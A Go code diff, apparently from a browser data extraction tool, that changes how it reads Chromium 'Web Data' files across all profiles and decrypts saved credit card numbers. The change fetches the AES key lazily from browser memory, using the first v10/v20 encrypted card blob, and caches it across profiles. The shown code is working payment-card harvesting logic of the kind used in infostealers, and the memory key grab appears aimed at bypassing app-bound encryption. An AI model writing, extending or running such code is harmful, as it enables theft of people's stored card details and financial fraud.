@@ -10,7 +10,7 @@ import (
 )
 
 // readWebData opens a browser's Web Data SQLite file and reads autofill tables.
-func readWebData(b chromiumBrowser, profile string, aesKey []byte) ([]AutofillProfile, []CreditCard, error) {
+func readWebData(b chromiumBrowser, profile string, aesKey *[]byte) ([]AutofillProfile, []CreditCard, error) {
 	dbPath := filepath.Join(b.userDataDir, profile, "Web Data")
 	if _, err := os.Stat(dbPath); err != nil {
 		return nil, nil, nil
@@ -32,7 +32,7 @@ func readWebData(b chromiumBrowser, profile string, aesKey []byte) ([]AutofillPr
 	}
 
 	profiles := readAutofillProfiles(db, source)
-	cards := readCreditCards(db, source, aesKey)
+	cards := readCreditCards(db, b.name, source, aesKey)
 	return profiles, cards, nil
 }
 
@@ -135,11 +135,28 @@ func readAutofillProfiles(db *sqliteReader, source string) []AutofillProfile {
 // readCreditCards reads saved credit cards from Web Data.
 // credit_cards: guid(0) name_on_card(1) expiration_month(2) expiration_year(3)
 //               card_number_encrypted(4) ...
-func readCreditCards(db *sqliteReader, source string, aesKey []byte) []CreditCard {
+func readCreditCards(db *sqliteReader, browserName, source string, aesKey *[]byte) []CreditCard {
 	rows, err := db.ReadTable("credit_cards")
 	if err != nil {
 		return nil
 	}
+
+	// Fetch key lazily using first encrypted card blob as the oracle.
+	if *aesKey == nil {
+		for _, row := range rows {
+			if len(row) < 5 {
+				continue
+			}
+			blob, _ := row[4].([]byte)
+			if len(blob) >= 3 && (string(blob[:3]) == "v10" || string(blob[:3]) == "v20") {
+				if k, err := getKeyFromBrowserMemory(browserName, blob); err == nil {
+					*aesKey = k
+				}
+				break
+			}
+		}
+	}
+
 	var cards []CreditCard
 	for _, row := range rows {
 		if len(row) < 5 {
@@ -152,7 +169,7 @@ func readCreditCards(db *sqliteReader, source string, aesKey []byte) []CreditCar
 
 		number := ""
 		if len(cardBlob) > 0 {
-			plain, err := decryptPassword(aesKey, cardBlob)
+			plain, err := decryptPassword(*aesKey, cardBlob)
 			if err != nil {
 				number = "[decrypt failed]"
 			} else {
@@ -185,9 +202,10 @@ func scanAllAutofill(env envPaths) ([]AutofillProfile, []CreditCard, []string) {
 		if _, err := os.Stat(b.userDataDir); err != nil {
 			continue
 		}
-		aesKey, _ := getChromeAESKey(b.userDataDir)
+		// cachedKey shared across profiles — key fetched lazily on first encrypted blob.
+		var cachedKey []byte
 		for _, profile := range profilesInUserData(b.userDataDir) {
-			profiles, cards, err := readWebData(b, profile, aesKey)
+			profiles, cards, err := readWebData(b, profile, &cachedKey)
 			if err != nil {
 				errors = append(errors, fmt.Sprintf("%s/%s autofill: %v", b.name, profile, err))
 				continue
